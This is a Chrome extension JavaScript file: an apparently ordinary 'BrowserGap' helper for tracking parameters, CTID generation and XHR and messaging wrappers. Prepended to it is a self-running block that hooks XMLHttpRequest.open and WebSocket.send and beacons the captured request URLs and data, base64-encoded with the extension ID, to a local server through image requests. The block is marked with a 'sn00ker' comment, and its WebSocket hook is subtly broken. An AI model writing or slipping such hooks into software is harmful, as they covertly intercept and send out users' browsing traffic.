function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
function BrowserGap(isContentScript, unittest) { //jshint ignore: line
    var isChrome = true;
    var _ctid = "",
        _version = "",
        _uiLang = "",
        _os = "";

    /*Initialized the BrowserGap by doing the following:
     * 1. Loads the tracking params*/
    function init(){
        _loadTrackingParams();
    }

    /*Getter function for version value*/
    function getVersion(){
        return _version;
    }

    /*Getter function for UI Lang value*/
    function getUILanguage(){
        return _uiLang;
    }

    /*Getter function for CTID value*/
    function getCTID(){
        return _ctid;
    }

    /*Getter function for OS value*/
    function getOS(){
        return _os;
    }

    /*Method to load the tracking params-
     * 1. CTID
     * 2. Market
     * 3. Intl
     * 4. Version
     * 5. OS*/
    function _loadTrackingParams() {
        _ctid = localStorage.getItem('ctid');
        if(!_ctid) {
            _ctid = _generateCTID();
            localStorage.setItem('ctid', _ctid);
        }
        _version = chrome.runtime.getManifest().version;
        _uiLang = chrome.i18n.getUILanguage();
        chrome.runtime.getPlatformInfo(function(platformInfo) {
            _os = platformInfo.os;
        });
    }

    /*Method that generates a unique CTID value*/
    function _generateCTID() {
        var strUUID= "";

        try {
            var timeSeed= ((new Date()).getTime()).toString();
            timeSeed= timeSeed.substr(timeSeed.length - 3);
            for (var seedOn= 0; seedOn < timeSeed; seedOn++){
                Math.random();
            }

            for (var charOn= 0; charOn < 32; charOn++){
                var charCur= Math.floor(Math.random() * 36);
                if (charCur > 25){
                    charCur= String.fromCharCode(48 + charCur - 26);
                } else{
                    charCur= String.fromCharCode(65 + charCur);
                }

                strUUID += charCur;

                switch (charOn) {
                    case 7:
                    case 11:
                    case 15:
                    case 19:
                        strUUID += '-';
                        break;
                }
            }
        }
        catch (e) {
            extGlobal.logManager.logErrorMessage('BrowserGap.generateCTID error: ' + e.message);
        }
        return strUUID;
    }

    /*Method to make a XHR request
     * @url: the url that needs to be requested
     * @callback: the callback function that needs to be called on 200 OK response
     * @err: the callback that handles the error scenario*/
    function xhr(url, callback, err){
        var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function()
        {
            if(this.readyState === XMLHttpRequest.DONE )
            {
                var response = {
                    text: this.responseText,
                    status: this.status
                };
                if(this.status === 200){
                    callback(response);
                }else {
                    err(response);
                }
            }
        };
        xmlhttp.open("GET", url, true);
        xmlhttp.send();
    }
    function addContentScriptListener(listener){
        chrome.runtime.onMessage.addListener(listener);
    }

    function emitToMain(msg, callback){
        chrome.runtime.sendMessage(msg, callback);
    }

    function getContentScriptAssetPath(assetName) {
        return chrome.extension.getURL(assetName);
    }

    /*Expose all the private functions through this object if unittest is true*/
    /* jshint ignore: start */
    if (unittest) {
        this._loadTrackingParams = _loadTrackingParams;
        this._generateCTID = _generateCTID;
        this._version = _version;
        this._os = _os;
        this._ctid = _ctid;
        this._uiLang = _uiLang;
        this.getContentScriptAssetPath = getContentScriptAssetPath;
        this.injectFunction = function(){
            _loadTrackingParams = this._loadTrackingParams;
            _os = this._os;
            _ctid = this._ctid;
            _version = this._version;
            _uiLang = this._uiLang;
        };
        this.syncData = function(){
            this._os = _os;
            this._ctid = _ctid;
            this._version = _version;
            this._uiLang = _uiLang;
        };
    }
    /* jshint ignore: end */

    this.isChrome = isChrome;
    this.init = init;
    this.getCTID = getCTID;
    this.getMarket = getUILanguage;
    this.getIntl = getUILanguage;
    this.getVersion = getVersion;
    this.getOS = getOS;
    this.xhr = xhr;
    this.addContentScriptListener = addContentScriptListener;
    this.emitToMain = emitToMain;
    this.localStorage = window.localStorage;
    if (isContentScript) {
        this.getContentScriptAssetPath = getContentScriptAssetPath;
    }
    return this;
}